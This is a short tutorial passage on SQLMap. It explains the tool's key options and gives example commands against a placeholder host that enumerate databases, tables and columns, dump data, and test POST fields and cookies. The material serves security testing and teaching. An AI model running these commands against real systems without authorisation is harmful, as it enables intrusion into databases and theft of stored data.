**Basic SQLMap Usage:**

The core of SQLMap revolves around targeting a vulnerable URL or HTTP request. Here's a fundamental example:

```bash
sqlmap -u "http://target.com/vulnerable.php?id=1"
```

* `sqlmap`: The command to launch SQLMap.
* `-u "http://target.com/vulnerable.php?id=1"`: Specifies the target URL. SQLMap will analyze this URL for potential SQL injection points.

**Key SQLMap Options:**

* **`-u <url>`:** Target URL.
* **`--dbs`:** Enumerate database management system databases.
* **`-D <database_name> --tables`:** Enumerate tables of a specific database.
* **`-D <database_name> -T <table_name> --columns`:** Enumerate columns of a specific table.
* **`-D <database_name> -T <table_name> -C <column1,column2,...> --dump`:** Dump data from specific columns of a table.
* **`--batch`:** Automatically select default options, avoiding interactive prompts.
* **`--level=<level>`:** Level of tests to perform (1-5, higher levels are more thorough but slower).
* **`--risk=<risk>`:** Risk level (1-3, higher risks include more intrusive tests).
* **`--random-agent`:** Use a random HTTP User-Agent header.
* **`--proxy=<proxy>`:** Use a proxy server.
* **`--cookie=<cookie>`:** Provide cookie data.
* **`--data=<data>`:** POST data.

**Example Scenarios:**

1.  **Enumerating Databases:**

    ```bash
    sqlmap -u "http://target.com/vulnerabilities/sqli/?id=1" --dbs --batch
    ```

2.  **Enumerating Tables:**

    ```bash
    sqlmap -u "http://target.com/vulnerable/sqli?id=1" -D <database_name> --tables --batch
    ```

3.  **Enumerating Columns:**

    ```bash
    sqlmap -u "http://target.com/vulnerable/sqli?id=1" -D <database_name> -T <table_name> --columns --batch
    ```

4.  **Dumping Data:**

    ```bash
    sqlmap -u "http://target.com/vulnerable/sqli?id=1" -D <database_name> -T <table_name> -C <column1,column2> --dump --batch
    ```

5.  **Using POST Data:**

    ```bash
    sqlmap -u "http://target.com/login.php" --data="username=test&password=test" --batch
    ```

6.  **Using Cookies:**

    ```bash
    sqlmap -u "http://target.com/profile.php" --cookie="sessionid=12345" --batch
    ```
